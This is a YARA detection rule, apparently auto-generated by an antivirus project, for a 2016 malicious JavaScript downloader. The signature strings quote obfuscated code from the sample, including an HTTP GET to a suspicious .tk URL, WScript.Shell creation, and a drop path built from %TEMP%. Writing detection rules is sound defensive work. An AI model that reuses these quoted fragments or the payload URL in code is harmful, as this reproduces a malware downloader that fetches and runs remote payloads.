rule sig_20160427_f16e427a16f55611fa312b50eb91d6a2 {
  meta:
    description = "datamaliciousorder - file 20160427_f16e427a16f55611fa312b50eb91d6a2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e9979d0cd800af2a80d5b56611b4088279b8c5689fa01b6bd24c1ae041789a89"

  strings:
    $s1  = "function SfakwBfzoo(XluulLzgat, DqskfVqujv){JxfdhEuqsj = JxfdhEuqsj * 1; return XluulLzgat - DqskfVqujv;};" fullword ascii
    $s2  = "XrfnbLaxkh[VwmjyWvqfm](\"G\" + \"ET\", \"http://jurang.tk/n2ysk\", false);" fullword ascii
    $s3  = "var FkzdsQddni = this[\"WScript\"];" fullword ascii
    $s4  = "function AtxlzDkpvr() {return GpghgYlcar[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"hvC9AZf" ascii
    $s5  = "function AtxlzDkpvr() {return GpghgYlcar[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"hvC9AZf" ascii
    $s6  = "function LlztiCsxsf(){return RwiuaZrohj + \"\";};" fullword ascii
    $s7  = "if (XrfnbLaxkh[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "var GpghgYlcar = function BfeuzMldlv() {return FkzdsQddni[TpllvSfgre](\"WScript\"+\".Shell\");}(), WugsnEpefe = 11;" fullword ascii
    $s9  = "function FltejDgijf() {return ((DwhxeRlmtz == true) && (DwhxeRlmtz == XrckdUhcit)) ? 1 : JxfdhEuqsj;};" fullword ascii
    $s10 = "}while (WaybaYjswi);" fullword ascii
    $s11 = "XrckdUhcit = true; " fullword ascii
    $s12 = "var ZzqngVownw = false;" fullword ascii
    $s13 = "function QmyrjFlrsx(){return 23;};" fullword ascii
    $s14 = "function OqqwmJznqz(RzljpHcoua) {var JcycnOtcsh = (1, 2, 3, 4, 5, RzljpHcoua); return JcycnOtcsh;};" fullword ascii
    $s15 = "ZzqngVownw = true;" fullword ascii
    $s16 = "function WdcrhXuxfr(){return TpllvSfgre;};" fullword ascii
    $s17 = "return SfakwBfzoo(PglomDplsk, HfaezLlwyo);" fullword ascii
    $s18 = "var SrzzfXyght = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "function QxeniTmuwg()" fullword ascii
    $s20 = "var DwhxeRlmtz = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}